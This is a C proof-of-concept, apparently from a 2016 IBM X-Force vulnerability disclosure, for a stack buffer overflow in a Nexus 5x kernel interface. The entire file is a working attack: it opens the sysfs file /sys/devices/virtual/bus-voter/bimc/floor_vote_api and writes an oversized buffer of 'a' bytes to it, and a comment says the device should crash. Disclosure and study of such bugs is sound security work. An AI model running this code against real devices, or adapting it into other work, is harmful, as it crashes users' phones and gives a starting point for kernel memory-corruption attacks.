/*
poc.c       - poc for stack buffer overflow, on nexus 5x.
Fingerprint - google/bullhead/bullhead:7.0/NBD90W/3239497:user/release-keys]

Sagi Kedmi(@sagikedmi), IBM X-Force, 18.10.2016.
*/
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <stdint.h>
#include <limits.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>

#define DBGFS_FILE "/sys/devices/virtual/bus-voter/bimc/floor_vote_api" 
#define PAYLOAD_SIZE 4096

int main(void){
    int fd;
    int aaa[PAYLOAD_SIZE];
    
    memset(aaa, 'a', sizeof(aaa));

    if ((fd = open(DBGFS_FILE, O_WRONLY)) < 0){
        perror("Could not open virtual file " DBGFS_FILE);
        return EXIT_FAILURE;
    }

    write(fd, aaa, sizeof(aaa));

    // Nexus 5x should crash.

    close(fd);
    return EXIT_SUCCESS;
}
